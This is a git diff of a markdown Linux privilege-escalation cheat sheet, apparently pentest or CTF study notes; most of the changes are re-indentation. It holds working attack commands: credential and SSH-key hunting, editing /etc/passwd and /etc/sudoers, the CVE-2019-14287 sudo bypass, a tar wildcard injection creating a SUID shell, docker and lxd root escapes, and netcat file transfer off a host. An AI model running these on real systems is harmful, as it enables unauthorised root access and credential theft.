@@ -42,12 +42,13 @@
 We should also check the 'history' command and the user history files to see if anything important has been run that can clue us in (or even passwords entered on the command line).
 
   ### *Find Command:* ###
-    Once we know our username, user id, and group names and ids, we can begin enumeration with the find command. 
+  Once we know our username, user id, and group names and ids, we can begin enumeration with the find command. 
 
     - #### *Files we own:* ####
       ```bash
       find / -user <our username> 2>/dev/null
       ```
+      
     - #### *Files belonging to our group:* ####
       ```bash
       find / -group <group-name> 2>/dev/null
@@ -63,8 +64,9 @@ We should also check the 'history' command and the user history files to see if 
       ```bash
       find / -type f -name *.<ext> 2>/dev/null
       ```
+      
     - #### *Finding Useful items:* ####
-    ```bash
+      ```bash
       PASSWORD INFO
       grep -rnw '/' -ie "pass" 2>/dev/null #Search for any files containing the string pass. also search for pass*= to count password= passwd= etc.
       
@@ -72,17 +74,15 @@ We should also check the 'history' command and the user history files to see if 
       find / -name authorized_keys -exec ls -la {} \;
       find / -name id_rsa -exec ls -la {}; cat {} \;
       find / -name *ssh* -exec ls -la {} \;
-      
-      
-    ```
+     ```
 
-    We can run the find command with '-exec ls -la {} \;' to run a command upon every result found (the result of find is filled into the {}).
-    It is worth noting that we can pipe (|) into 'grep -v '<str1>\|<str2>...' to filter out results we do not want.
-    A useful thing to do is redirect the results to a file (/tmp is typically a word writeable directory), and then go through.
+   We can run the find command with '-exec ls -la {} \;' to run a command upon every result found (the result of find is filled into the {}).
+   It is worth noting that we can pipe (|) into 'grep -v '<str1>\|<str2>...' to filter out results we do not want.
+   A useful thing to do is redirect the results to a file (/tmp is typically a word writeable directory), and then go through.
 
 
   ### *Useful Files and Directories to Check:* ###
-    - #### *DIRECTORIES:* ####
+   - #### *DIRECTORIES:* ####
       - /home/* - all users home directories
       - /home/*/.ssh - if we can write to a user's ssh directrory, or create one then we can gain a foothold as a different user
       - /var/backups - typical back up folder
@@ -92,7 +92,7 @@ We should also check the 'history' command and the user history files to see if 
       - /var/mail - mail directory
       - /var/www/* - web directory, often containing the web log file or database which we can look through for credentials.
 
-    - #### *FILES:* ####
+   - #### *FILES:* ####
       - /etc/passwd - cat and pipe into 'grep /bin' to find names of all users on the box that have shells. If writeable we can duplicate the root users line and just generate a password hash with: ```bash openssl passwd -1 -salt <salt> <password>```, then place it in the position of the password. 
       - /etc/group - cat this to find a list of groups and which users are in which group.
       - /etc/sudoers - we may be able to read sudo permissions of users without using sudo -l, hoping for a NOPASSWD entries so that we may use and exploit. If this file is writeable, we can append this line to give ourselves sudo access to all commands to privesc with: ```bash echo "<username> ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers ```
@@ -101,177 +101,184 @@ We should also check the 'history' command and the user history files to see if 
 
 
   ### *Suid Files:* ###
-    List all files that you can access that have SUID permissions
+  List all files that you can access that have SUID permissions
     ```bash
     find / -perm -4000 2>/dev/null
     ```
-    Check on https://gtfobins.github.io/ for anything useful. 
-    Sometimes the results will contain something cutsom which you can go on to enumerate, reverse engineer, and exploit.
+  Check on https://gtfobins.github.io/ for anything useful. 
+  Sometimes the results will contain something cutsom which you can go on to enumerate, reverse engineer, and exploit.
 
 
   ### *Sudo:* ###
-    List which files you have sudo permissions for:
+  List which files you have sudo permissions for:
+  
     ```bash
     sudo -l
     ```
-    Check on https://gtfobins.github.io/ for anything useful. 
-    Sometimes the results will contain something custom which you can go on to enumerate, reverse engineer, and exploit.
-    If the output is something like 'ALL = (jones) /usr/local/bin/mycommand', then we can run 'mycommand' as the 'jones' user. We do this with:
+    
+   Check on https://gtfobins.github.io/ for anything useful. 
+   Sometimes the results will contain something custom which you can go on to enumerate, reverse engineer, and exploit.
+   If the output is something like 'ALL = (jones) /usr/local/bin/mycommand', then we can run 'mycommand' as the 'jones' user. We do this with:
+    
+    
     ```bash
     sudo -u jones /usr/local/bin/mycommand
     ```
 
-    Probably one of the biggest Sudo exploits is CVE-2019-14287. If the user has sudo permissions: '(ALL, !root) ALL', this can be exploited. A FULL TTY IS REQUIRED (so stabilise your shell).
-    ```bash
-    sudo -u#-1 /bin/bash -p
-    ```
+   Probably one of the biggest Sudo exploits is CVE-2019-14287. If the user has sudo permissions: '(ALL, !root) ALL', this can be exploited. A FULL TTY IS REQUIRED (so stabilise your shell).
+   
+
+  ```bash
+  sudo -u#-1 /bin/bash -p
+  ```
 
 
   ### *Capabilities:* ###
-    List all capabilities that applications have:
-    ```bash
-    getcap -r / 2>/dev/null
-    ```
-    Check on https://gtfobins.github.io/ for anything useful.
-    'cap_setuid' is an interesting capability. Even though the program is not a SUID file itslef, it has permissions to run code that sets the user id, and group id.
-    'ep' is another interesting capability, meaning the binary has all capabilities.
+  List all capabilities that applications have:
+  ```bash
+  getcap -r / 2>/dev/null
+  ```
+  Check on https://gtfobins.github.io/ for anything useful.
+  
+  'cap_setuid' is an interesting capability. Even though the program is not a SUID file itslef, it has permissions to run code that sets the user id, and group id.
+  
+  'ep' is another interesting capability, meaning the binary has all capabilities.
 
 
   ### *PATH Variable Exploitation:* ###
-    When we have access to a binary that is SUID or that you have Sudo accesses for, this obviously allows for a privilege escalation vector (whether lateral or upwards). Even better if we have access to the code behind the binary... if not we can reverse engineer it, running it to find out what it is doing, or decompiling in Ghidra, and analysing. The main thing we are looking for, is a command that is run without its full path. For example running 'date' rather than '/usr/bin/date'.
+  When we have access to a binary that is SUID or that you have Sudo accesses for, this obviously allows for a privilege escalation vector (whether lateral or upwards). Even better if we have access to the code behind the binary... if not we can reverse engineer it, running it to find out what it is doing, or decompiling in Ghidra, and analysing. The main thing we are looking for, is a command that is run without its full path. For example running 'date' rather than '/usr/bin/date'.
 
 
-    Linux looks for binaries in a way which makes it exploitable. It will look in the user's PATH variable, which contains a lists of directories. Therefore, if we prepend '/tmp:' to the beginning of the PATH variable, then make our own 'date' file that is executable in the /tmp folder, we can make the program run whatever code we wish, with privileges of the user which the program runs as.
+  Linux looks for binaries in a way which makes it exploitable. It will look in the user's PATH variable, which contains a lists of directories. Therefore, if we prepend '/tmp:' to the beginning of the PATH variable, then make our own 'date' file that is executable in the /tmp folder, we can make the program run whatever code we wish, with privileges of the user which the program runs as.
 
-    ```bash
-    export PATH=/tmp:$PATH
-    ```
-
+  ```bash
+  export PATH=/tmp:$PATH
+  ```
 
   ### *Python Import Exploitation:* ###
-    In a similar way to PATH exploitation, we can exploit the way in which python programs import modules or libraries too...
+  In a similar way to PATH exploitation, we can exploit the way in which python programs import modules or libraries too...
 
-    Python will look in the current folder with the rest fo the .py code files. It then goes off to the python root folder (/usr/local/python*). If these are writeable, or the folder is writeable by us then we can create our own code to be imported and run. Alternatively, we can check the PYTHONPATH environment variable to specify where it imports from, and perhaps change this if we are given permission to do so. This videos shows this: https://www.youtube.com/watch?v=ZwYqDZOvUpY&feature=emb_title
+  Python will look in the current folder with the rest fo the .py code files. It then goes off to the python root folder (/usr/local/python*). If these are writeable, or the folder is writeable by us then we can create our own code to be imported and run. Alternatively, we can check the PYTHONPATH environment variable to specify where it imports from, and perhaps change this if we are given permission to do so. This videos shows this: https://www.youtube.com/watch?v=ZwYqDZOvUpY&feature=emb_title
 
 
   ### *Processes:* ###
-    To quickly find sechedules tasks, we can run donwload and run [pspy](https://github.com/DominicBreuker/pspy). This tells us all processes that are running. Using the -i flag, we can specify how often the scan should occur in milliseconds.
+  To quickly find sechedules tasks, we can run donwload and run [pspy](https://github.com/DominicBreuker/pspy). This tells us all processes that are running. Using the -i flag, we can specify how often the scan should occur in milliseconds.
 
-    Other useful commands:
-    ```bash
-    crontab -l
-    cat /etc/crontab
-    cat /etc/cron*
+  Other useful commands:
+  ```bash
+  crontab -l
+  cat /etc/crontab
+  cat /etc/cron*
 
-    systemctl list-timers --all
-    
-    ps -aux #List all services running.
-    ps -eaf --forest #Shows in a nice format, and clearly shows children processes.
-     ```
+  systemctl list-timers --all
+
+  ps -aux #List all services running.
+  ps -eaf --forest #Shows in a nice format, and clearly shows children processes.
+  ```
 
 
   ### *Wildcard Exploitation:* ###
-    If a command is scheduled to run with wildcards, you can exploit this in a very interesting way... this is often used to break out of containers or priv esc to root.
+  If a command is scheduled to run with wildcards, you can exploit this in a very interesting way... this is often used to break out of containers or priv esc to root.
 
-    A straightforward example: create a file called '-la', then run 'ls *'. the file called -la is interpreted as an argument option for the ls command. Therefore, ls -la is what the system runs.
+  A straightforward example: create a file called '-la', then run 'ls *'. the file called -la is interpreted as an argument option for the ls command. Therefore, ls -la is what the system runs.
 
-    A privesc example of this:
-    ```bash
-    #When you see this: 'tar cf archive.tar *':
+  A privesc example of this:
+  ```bash
+  #When you see this: 'tar cf archive.tar *':
 
-    touch -- "--checkpoint=1"
-    touch -- "--checkpoint-action=exec=sh shell.sh"
-    echo "#\!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
+  touch -- "--checkpoint=1"
+  touch -- "--checkpoint-action=exec=sh shell.sh"
+  echo "#\!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
 
-    # Once the scirpt is executed, you will be able to run /tmp/bash -p to escalate to the user who owns the file.
-    ```
+  # Once the scirpt is executed, you will be able to run /tmp/bash -p to escalate to the user who owns the file.
+  ```
 
 
   ### *Docker:* ###
-    If the user is in the docker group, you can escalate with no special permissions:
+  If the user is in the docker group, you can escalate with no special permissions:
     ```bash
     docker run -it --rm -v $PWD:/mnt bash
     ```
 
 
   ### *LXD Group Privesc:* ###
-    If the user is in the lxd group, then you can escalate again with no special permissions:
-    ```bash
-    #Often the git cloning will be run on your machine and then the file transferred over.
-    git clone https://github.com/saghul/lxd-alpine-builder
-    ./build-alpine -a i686
+  If the user is in the lxd group, then you can escalate again with no special permissions:
+  ```bash
+  #Often the git cloning will be run on your machine and then the file transferred over.
+  git clone https://github.com/saghul/lxd-alpine-builder
+  ./build-alpine -a i686
 
-    #The image would be transferred to the remote machine here.
+  #The image would be transferred to the remote machine here.
 
-    lxc image import ./alpine.tar.gz --alias myimage
-    lxc init myimage mycontainer -c security.privileged=true
+  lxc image import ./alpine.tar.gz --alias myimage
+  lxc init myimage mycontainer -c security.privileged=true
 
-    # mount the /root into the image
-    lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+  # mount the /root into the image
+  lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-    # interact
-    lxc start mycontainer
-    lxc exec mycontainer /bin/sh
-    ```
+  # interact
+  lxc start mycontainer
+  lxc exec mycontainer /bin/sh
+  ```
 
 
   ### *KERNEL EXPLOITS:* ###
-    ```bash
-    #Show Kernel information:
-    uname -a 
-    cat /proc/version
-    
-    #Find the machines architecture (64 bit, 32 bit, number of CPUs)
-    lscpu 
-    ```
-    The above will show you the kernel version you are running. It is now as striaghtforward as searching for exploits on exploitdb, or using searchsploit.
+  ```bash
+  #Show Kernel information:
+  uname -a 
+  cat /proc/version
+
+  #Find the machines architecture (64 bit, 32 bit, number of CPUs)
+  lscpu 
+  ```
+  The above will show you the kernel version you are running. It is now as striaghtforward as searching for exploits on exploitdb, or using searchsploit.
 
   ## *Internal Network Enumeration:* ##
-    ```bash
-    #Shows ip information
-    ifconfig 
-    ip a
-    
-    #Show routing information
-    route
-    ip route
-    
-    #Arp information
-    arp -a
-    ip neigh
-    
-    #Show which ports are available/operational on the machine
-    #We are looking for 127.0.0.1:<port num> to tell us that there is a port open only for the localhost. 
-    netstat -ano
-    ```
+  ```bash
+  #Shows ip information
+  ifconfig 
+  ip a
+
+  #Show routing information
+  route
+  ip route
+
+  #Arp information
+  arp -a
+  ip neigh
+
+  #Show which ports are available/operational on the machine
+  #We are looking for 127.0.0.1:<port num> to tell us that there is a port open only for the localhost. 
+  netstat -ano
+  ```
     
     
   ## *Transferring Files On and Off Linux Machines:* ##
-    - ### *Python* ###
-      ```bash
-      # Change to the folder that the file is in.
-      python -m SimpleHTTPServer 8080
-      python3 -m http.server 8080
-      
-      #Then use 'wget <ip>:<port>/<file>' to download.
-      ```
-    
-    - ### *SCP* ###
-      ```bash
-      #REQUIRES an ssh private key or a password.
-      
-      #From your machine
-      scp <file> user@<remoteip>:<dest path on remote host>
-      
-      #To your machine
-      scp user@<remoteip>:<path on remote host> <dest path on your machine>
-      ```
+  - ### *Python* ###
+    ```bash
+    # Change to the folder that the file is in.
+    python -m SimpleHTTPServer 8080
+    python3 -m http.server 8080
 
-    - ### *Netcat* ###
-      ```bash
-      #On receiving machine:
-      nc -lvnp 8080 > file.out
-      
-      #On Sending Machine:
-      nc <receiving machine IP> 8080 < file
-      ```
+    #Then use 'wget <ip>:<port>/<file>' to download.
+    ```
+
+  - ### *SCP* ###
+    ```bash
+    #REQUIRES an ssh private key or a password.
+
+    #From your machine
+    scp <file> user@<remoteip>:<dest path on remote host>
+
+    #To your machine
+    scp user@<remoteip>:<path on remote host> <dest path on your machine>
+    ```
+
+  - ### *Netcat* ###
+    ```bash
+    #On receiving machine:
+    nc -lvnp 8080 > file.out
+
+    #On Sending Machine:
+    nc <receiving machine IP> 8080 < file
+    ```
